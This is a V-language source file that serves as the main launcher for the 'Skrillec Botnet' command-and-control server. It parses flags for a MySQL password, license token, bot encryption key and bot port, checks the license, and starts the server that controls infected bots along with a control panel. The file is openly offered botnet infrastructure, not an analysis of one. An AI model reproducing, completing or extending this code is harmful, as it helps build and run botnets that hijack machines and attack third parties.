/*
	[ ~ Skrillec Botnet ~ ]

	Developers:
		- Occupied
		- social

	Since: 
		11/17/21

*/


// Importing Modules
import os
import net
import mysql

//Importing SubModules
import utils
import server
import config
import skrillec_cp

fn main() {
	//get mySQL info
	mut info := config.get_db_info()
	mut svr := server.Server{clients: &server.Clients{}, sqlconn: mysql.Connection{
		host: info[0],
		port: info[1].u32(),
		username: info[2],
		dbname: info[3]
	}, current: &server.Current{}, notice: &utils.NotificationSys{}, bots: &server.Bots{}, parser: &utils.Parse{}}
	// Update Check. Making sure this is the latest update or it will ask you to update the binary!
	server.update_check()
	
	// Command Parsing 
	mut cmd_args := os.args.clone()
	for i, v in cmd_args { // Command Handler
		if v == "--help" { print("${config.Help_MENU}\r\n") exit(0) } // Help Menu
		if v == "-p" { svr.set_port(cmd_args[i+1]) } // Setting Port If Found!
		if v == "-sqlpw" { svr.sqlconn.password = cmd_args[i+1] } // Setting MySQL PW
		if v == "-t" { svr.cnc_key = cmd_args[i+1] } // Setting SKRILLEC License Key
		if v == "-b_key" { svr.bot_encryption = cmd_args[i+1] } // Grab Bot Encryption Key (add a error handler down below)
		if v == "-b_port" { svr.set_bot_port(cmd_args[i+1]) } // Grab the bot port to host on (add a error handler down below)

		if v == "-reset_config" {
			if cmd_args[i+1] == "MySQL" {
				//reset mysql info
			} else if cmd_args[i+1] == "-net_info" {
				// reset net_info 
			} else if cmd_args[i+1] == "-y" {
				// Execute function that'd reset the whole config file to default
			}
		}

	}

	if svr.cnc_key.len == 0 {
		println("[x] Error, No token was set!")
		exit(0)
	}

	if (svr.sqlconn.password).len == 0 { // MySQL password can only be received this way
		println("[x] Error, Unable to start the server without MySQL password. Use -sqlpw flag to set the password or --help for help!")
		exit(0)
	}

	if svr.port.len == 0 { // If the port wasnt given on the boot up command then look for port in config file
		println("[x] Warning. No port was provided. Looking through config file for port.........!")
		port := utils.grab_port()
		if port == "" {
			println("[x] Error, No port was found in the config file. You can add the port setting to the config file or use '-p' flag to set the port. Use --help for more help!")
			exit(0)
		}
		svr.set_port(port)
	}

	if svr.bot_port.len == 0 { 
		println("[x] Warning. No bot port was provided, use the '-b_port' flag to set a port for the bot or use '--help' for more help!")
		exit(0)
	}

	// License token validation
	if server.validate_token(mut &svr) == 0 {
		println("[x] Invalid token")
		exit(0)
	}
	// Start Server In a Thread (Background)
	go server.start_skrillec(mut &svr)
	// Start the CNC CP to control the CNC from server/VPS!
	skrillec_cp.main_cp()
	
} 